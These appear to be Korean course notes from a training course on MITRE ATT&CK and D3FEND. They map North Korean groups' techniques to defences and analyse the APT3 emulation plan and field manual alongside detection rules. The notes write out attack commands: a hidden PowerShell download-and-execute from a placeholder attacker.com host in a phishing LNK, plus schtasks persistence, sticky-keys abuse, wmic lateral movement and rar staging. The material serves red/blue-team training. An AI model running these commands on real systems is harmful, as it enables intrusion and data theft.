> 📷 세 그룹의 행위를 ATT&CK에 매핑: 라자루스 — T1190(외부 웹서버 해킹), T1599(망 연계 시스템 통해 내부 침투), T1005·T1074.001(자료 수집·스테이징), T1567.002(클라우드로 유출). 안다리엘 — T1586.002·T1078(이메일 계정 탈취·비밀번호 재사용), T1133(원격 유지보수 솔루션), T1021(악성코드 설치), T1041(C2 채널 유출). 김수키 — T1190(인증 우회 취약점), T1567(웹 서비스로 유출).

> 📷 ATT&CK → D3FEND 대응 매핑 1: T1190은 Application Hardening(보안 코딩·패치)·Dynamic Analysis(WAF로 실시간 탐지), T1586.002는 Credential Hardening(강한 암호·계정 잠금), T1078은 MFA·Domain Account Monitoring(비정상 로그인·권한 변경), T1041은 Outbound Traffic Filtering(Egress 허용 목록)·Per Host Download-Upload Ratio Analysis(업로드 비율 이상), T1133은 Network Traffic Filtering(허가된 IP·국가만)·User Geolocation Logon Pattern Analysis(불가능한 이동 탐지).

> 📷 대응 매핑 2: T1599는 Broadcast Domain Isolation(VLAN·방화벽 분할)·Protocol Metadata Anomaly Detection, T1005는 Local File Permissions(ACL)·File Analysis(대량 파일 접근 탐지), T1074.001은 File Analysis(임시 폴더·휴지통의 대용량 압축 파일)·Process Spawn Analysis(7-Zip·WinRAR·xcopy 비정상 실행), T1021은 Network Isolation(자동 격리)·Session Termination, T1567.002는 Outbound Traffic Filtering·업로드 비율 분석.

> 📷 강의 요약: D3FEND는 20여 년의 문헌·특허 분석으로 2021년 6월 발표된 방어 기법 지식 그래프. Model·Harden·Detect·Isolate·Deceive·Evict·Restore 단계별 대응 체계를 갖추고, 공격과 방어를 Digital Artifact로 연결해 추론이 가능하다. 라자루스·안다리엘·김수키의 TTP에 MFA·세그먼트 분리·트래픽 분석 같은 대응을 매핑해 실무 방안을 제시.


## 2026 실전형 사이버 훈련장[MITRE ATT&CK]2

> 📷 강의 '공격 에뮬레이션 플랜 사례 분석 – APT3' 목표: 플랜을 3단계로 분석하고 단계별 TTP와 탐지 포인트 도출. APT3는 스피어 피싱·제로데이·DLL 사이드로딩으로 침투하고 HTTP 쿠키 비컨과 슬립으로 C2를 숨긴다. 내부에서는 OSInfo·Mimikatz·Pwdump·ChromePass로 탐색·자격증명 탈취, RemoteCMD·RDP로 측면 이동, 마지막으로 WinRAR로 압축·암호화해 휴지통에 스테이징한 뒤 443 SSL로 유출.

> 📷 APT3: 중국 기반의 조직화된 위협 그룹(Gothic Panda, Pirpi, UPS, TG-0110 등으로도 불림). 국가 이익을 위한 첩보 활동으로 장기간 은밀히 데이터를 유출하며, 미국 등 전 세계 항공우주·국방·건설·엔지니어링·하이테크 통신·운송 분야를 노린다. 제로데이, Pirpi·PlugX 같은 맞춤형 도구, 정교한 역할 분담이 특징. 공격은 3단계 — 초기 침투(C2 설정·방어 회피), 네트워크 전파(발견·권한 상승·측면 이동·지속성), 데이터 유출.

> 📷 APT3 도구 1(커스텀은 대체 도구로 에뮬레이션 권장): Pirpi·SHOTPUT·CookieCutter 백도어와 PlugX(RAT → Metasploit·Cobalt Strike로 대체, 방어 회피·자격증명·발견), OSInfo(net use·systeminfo·set 등으로 정보 수집), 수정된 pwdump·Mimikatz(비밀번호 덤프), 키로거.

> 📷 APT3 도구 2: RemoteCMD(PsExec처럼 원격 실행, 측면 이동), Dsquery(AD 정보 발견, 윈도우 서버 기본 탑재), Chrome Pass(NirSoft 브라우저 비밀번호 덤프), LaZagne(애플리케이션 비밀번호 덤프, GitHub 공개), ScanBox(초기 침투 전 쓰는 익스플로잇 킷·호스트 프로파일러·JS 키로거).

> 📷 강의 영상 화면: Dsquery로 Active Directory의 도메인 → Users(Admin, Guest) / Groups(IT, HR) 구조를 조회하는 그림. 자막은 "기본적으로 존재하지 않는 클라이언트 시스템이라도 공격자가 직접 (복사해 쓸 수 있다)".

> 📷 APT3 Emulation Plan: 다양한 페이로드를 담은 스팸형 피싱을 뿌리고, 진입하면 사용자 정보·네트워크 위치·시스템 구성을 수집해 자산 가치를 평가하며 관리자 권한 탈취를 최우선으로 한다. Phase1(C2 설정 → 소프트웨어 패킹 → 파일 난독화 → 초기 접근), Phase2(호스트 장악 → 방어 회피·발견·권한 상승 → 자격증명 접근·지속성 → 측면 이동 → 실행 반복), Phase3(수집 → 압축·스테이징 → 유출).

> 📷 Phase 1 초기 침투: 목표는 최초 코드 실행과 제어권 확보. 접근 경로는 스피어 피싱 기반으로 IE·Windows·Flash 제로데이/기존 취약점, 워터링 홀(취약한 정상 사이트 침해 후 드라이브 바이), 이력서 위장·정상 소프트웨어(TTCalc)에 악성 코드 삽입. 임플란트는 일정 간격 HTTP GET 비컨으로 명령을 기다리고, 정보를 HTTP 쿠키에 담아 보내며 명령은 정상 HTML 태그 안에 인코딩. 슬립·안티 샌드박스로 분석을 피하고 일부는 SSL 사용.

> 📷 Phase 1 방어 회피: 오픈소스 도구를 수정·난독화·패킹, 특정 명령행 인자가 있어야만 동작하게 해 자동 샌드박스 분석 무력화, DLL 사이드로딩(Chrome 같은 정상 프로그램이 악성 DLL을 함께 로드). 실전 사례: ① IE(CVE-2014-6332)·커널(CVE-2014-4113) 취약점 후 `cmd.exe /C whoami`, `schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON /ru "System"`로 지속성 ② 정상 ttcalc.exe와 Pirpi를 함께 배포해 `rundll32.exe ...\mt.dat UpdvaMt` 실행 ③ GIF에 Pirpi를 숨긴 스테가노그래피, %ALLUSERSPROFILE%\chrome_frame_helper 경로 사이드로딩(T1027, T1073) ④ ScanBox로 브라우저 플러그인·내부 IP·소프트웨어 정보 수집.

> 📷 Phase 2 네트워크 전파 흐름도(APT3 Phase 2 Flow Chart): 최초 장악 호스트 → 방어 회피·발견·크리덴셜 접근·지속성·권한 상승 → 측면 이동 → 실행 → (반복) → 유출. 목표는 자격증명과 기밀 문서를 찾아 내부망을 확산해 최종 목표물에 도달하는 것.

> 📷 Phase 2 세부: 탐색 — OSInfo와 net user·net group으로 Domain Admins·Enterprise Admins 같은 고권한 그룹 식별, 시스템 구성(T1016)과 네트워크 연결(T1049)로 다음 대상 선정. 권한 상승·지속성 — CVE-2014-4113 또는 탈취 자격증명, 고정 키(sethc.exe를 cmd.exe로 교체해 RDP 화면에서 인증 없이 명령 프롬프트), support_388945a0 같은 관리자 계정 생성. 자격증명·측면 이동 — Mimikatz·Pwdump로 메모리 비밀번호, ChromePass·LaZagne, net use로 공유 마운트·비밀번호 재사용 확인, RemoteCMD로 원격 실행·파일 전송.

> 📷 Phase 3 유출: 관심 문서(주로 오피스) 수집(T1005) → 커맨드라인 WinRAR(중국어판)로 압축·암호화(T1002) → 스테이징 머신의 휴지통 폴더에 저장(T1074) → 주로 443 포트로 SSL 또는 HTTP 전송(T1022, T1048, T1041), FTP 등도 가능.

> 📷 강의 요약: APT3 에뮬레이션 플랜은 실제 그룹 TTP를 3단계로 구조화해 레드팀이 재현할 수 있는 청사진을 준다. 커스텀 도구는 Metasploit·Cobalt Strike 등으로 대체하고, 단계별 기법이 ATT&CK ID로 매핑돼 블루팀이 탐지 규칙 개발과 가시성 점검에 바로 쓸 수 있다.

> 📷 강의 '공격 에뮬레이션 필드 메뉴얼 사례 분석 – APT3' 목표: 필드 매뉴얼 구조와 APT3 단계별 명령어·탐지 전략 이해. Phase1은 whoami /all, systeminfo, netstat -ano로 호스트·네트워크 현황과 보안 프로세스 파악, Phase2는 net group "Domain Admins" /domain으로 고권한 계정 목록 작성 후 reg add·schtasks /create로 자동 실행 등록, Phase3은 net use·wmic로 SMB 측면 이동 후 dir /s /b로 기밀 문서를 찾아 압축·암호화·유출. 단계마다 EDR/SIEM 탐지 포인트가 제시된다.

> 📷 필드 매뉴얼(Adversary Emulation Field Manual): 특정 그룹의 알려진 작업을 명령어 단위로 분류한 문서. 표 형식은 기법 ID별로 윈도우 기본 명령 / Cobalt Strike / Metasploit / 설명 — 예: T1082 ver·set·systeminfo, T1033 whoami /all /fo list, T1016 ipconfig /all·arp -a·route print, T1012 reg query ...Terminal Server /v fDenyTSConnections, T1049 netstat -ano, T1057 tasklist /v, T1069 net localgroup "Administrators"·net group "Domain Admins" /domain, T1087 net user /domain, T1018 net group "Domain Computers"·"Domain Controllers", T1077 net use.

> 📷 강의 영상 화면(같은 표 위 판서): 실제 침해 사고 데이터를 바탕으로 특정 그룹이 쓴 공격 기법(Techniques)·도구(Tools)·절차(Procedures), 즉 TTP를 정리한 것이 필드 매뉴얼.

> 📷 강의 영상 화면: 필드 매뉴얼 구조도 — Infrastructure 아래 Initial Access, Execution(whoami, systeminfo), Discovery(ipconfig, netstat). 자막: "(방어를) 강화하는 데 최적화된 지침서".

> 📷 Phase 1 — 호스트·세션 정체성 파악: systeminfo, whoami /all, hostname으로 OS 버전·패치 현황(RCE·LPE 가능성)과 그룹·특권 토큰(SeDebugPrivilege 등) 확인. 일반 사용자의 systeminfo 실행은 비정상이므로 EDR/SIEM에서 프로세스 생성 이벤트로 감시. 네트워크·보안 프로세스 탐색: ipconfig /all, netstat -ano, tasklist /v로 서브넷·활성 세션·인접 서버·엔드포인트 보안 제품 파악, netstat로 자주 통신하는 파일 서버·DB를 측면 이동 대상으로 선정. tasklist 인자에 MsMpEng.exe 같은 보안 프로세스가 들어가면 패턴 매칭으로 탐지.

> 📷 Phase 2 — 도메인 인프라·권한 구조 탐색: net user /domain, net group "Domain Admins" /domain으로 DC에 질의해 고권한 계정 목록 확보(이후 자격증명 탈취·스피어 공격용). 단일 호스트의 대량 AD 쿼리는 이벤트 로그(4661 등)로 경고. 지속성: reg add로 시작 프로그램 키에 악성 경로 등록, schtasks /create로 주기적 비콘 예약 작업 생성. Autoruns와 schtasks.exe 실행 로그를 상시 감시하고 Updates·JavaUpdate처럼 정상 서비스로 위장한 등록을 전수 조사.

> 📷 Phase 3 — 측면 이동: net use, wmic /node:"target" process call create로 관리자 공유와 원격 관리 도구를 이용해 인접 시스템에 코드 전파. SMB(445)+WMI 조합은 RDP보다 흔적이 적다 → 호스트 간 C$ 접근 로그(Event ID 5140)와 비정상 WMI 원격 호출 패턴 추적. 수집·유출: dir /s /b *.xlsx *.pdf로 기밀 문서 검색 후 rar a로 압축·암호화 → 대량 파일 접근에 따른 디스크 I/O 급증, 압축 프로그램의 이례적 실행, 해외 IP로의 대용량 아웃바운드를 상관 분석.

> 📷 실습 시나리오 개요 그림: 레드팀 에뮬레이션(① 스피어피싱 첨부 T1566.001 — ZIP 속 Job_Description.lnk ② C2 연결·비콘으로 페이로드 다운로드 ③ cmd로 whoami /all·net user /domain·tasklist /v 탐색 T1059.003) → ATT&CK Navigator로 APT3 기법 집합과 현재 탐지 능력을 겹쳐 Gap(예: T1055 Process Injection) 발견 → 블루팀 대응(D3-PSA 프로세스 생성 분석으로 Word→CMD를 Sigma 룰로 탐지, D3-SFP로 AppLocker 정책 'Downloads의 LNK 차단', 강화된 방어 레이어).

> 📷 Phase 0 초기 침투: 인사팀을 사칭해 2026_복지혜택_안내.zip(내부에 Job_Description.lnk)을 발송. LNK 대상 경로에 `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"`를 넣어, 실행 시 백그라운드에서 C2와 통신하며 원격 셸 획득.

> 📷 Phase 1 명령: whoami /all(사용자·그룹·권한 토큰으로 권한 상승 필요성 판단), systeminfo(OS 빌드·패치로 취약점 대상 선정), ipconfig /all·netstat -ano(IP·연결 세션으로 측면 이동 경로), tasklist /v(백신·보안 솔루션 확인). 필드 매뉴얼 예: whoami /all, systeminfo, tasklist /svc, `netstat -ano | findstr ESTABLISHED`.

> 📷 Phase 2: `net group "Domain Admins" /domain`으로 네트워크 전체를 통제할 계정 파악, `net group "Domain controllers" /domain`으로 DC 위치 확인 — 이후 자격증명 탈취·스피어 피싱 대상 DB로 활용. 지속성은 reg add로 시작 프로그램 키 등록, schtasks /create로 주기적 비콘 실행 설정해 영구 C2 채널 확보.

> 📷 Phase 3: net use로 관리자 공유 접근, wmic·psexec로 원격 컴퓨터에서 악성 코드 강제 실행해 파일 서버·DB 서버 접근 권한 획득. dir /s로 설계도·재무·고객 정보 문서를 찾고 rar·7z로 압축·암호화해 네트워크 감시를 피한 뒤 C2로 전송.

> 📷 방어 시나리오 Phase 1(호스트 정찰 탐지): 일반 사용자 계정에서 whoami /all·systeminfo·hostname이 짧은 시간에 연속 실행되는 패턴, 한 호스트에서 ipconfig /all·netstat -ano가 몰리는 경우를 경고. tasklist /v 인자·출력에 MsMpEng.exe·CylanceSvc.exe 같은 보안 프로세스명이 나오면 패턴 매칭. Sysmon Event ID 1로 cmd.exe/powershell.exe를 부모로 하는 정찰 명령 체인(whoami → systeminfo → ipconfig → netstat → tasklist)의 순차 실행을 상관 분석.

> 📷 방어 시나리오 Phase 2(도메인 정찰·지속성 무력화): 단일 호스트의 대량 AD 쿼리(Event ID 4661) 경고, Run 키·예약 작업에 'Update' 등으로 위장한 등록 전수 조사, Domain Admins에 대한 비정상 접근 실시간 분석. Phase 3(측면 이동·유출 차단): 호스트 간 비정상 SMB(445)와 C$ 접근(Event ID 5140) 추적, 평소와 다른 대용량 아웃바운드·rar/7z 이례적 실행·대량 파일 접근 상관 분석, wmic·psexec 원격 프로세스 생성 패턴 매칭.

> 📷 강의 요약: 필드 매뉴얼은 에뮬레이션 플랜보다 실행 수준으로 세분화된 문서로, 명령마다 공격 의도·예상 출력·탐지 포인트가 붙어 레드팀 명령 레퍼런스이자 블루팀 룰 개발 자료가 된다. 시나리오는 스피어 피싱 LNK → 도메인 장악 → 데이터 유출로 이어지며, 핵심 방어는 단일 호스트의 대량 AD 쿼리·비정상 WMI 원격 호출·대용량 아웃바운드를 상관 분석하는 것.

> 📷 강의 영상 예시 화면: 관리자 PowerShell에서 whoami /all → SeDebugPrivilege Enabled, 그룹 Domain Admins·Local System 확인 후 systeminfo 실행.

> 📷 강의 영상 예시 화면: `netstat -ano | findstr ESTABLISHED` 결과 192.168.1.15:5032 → 외부 443 연결이 ESTABLISHED — 자주 통신하는 대상을 찾아 측면 이동·C2 경로 파악.
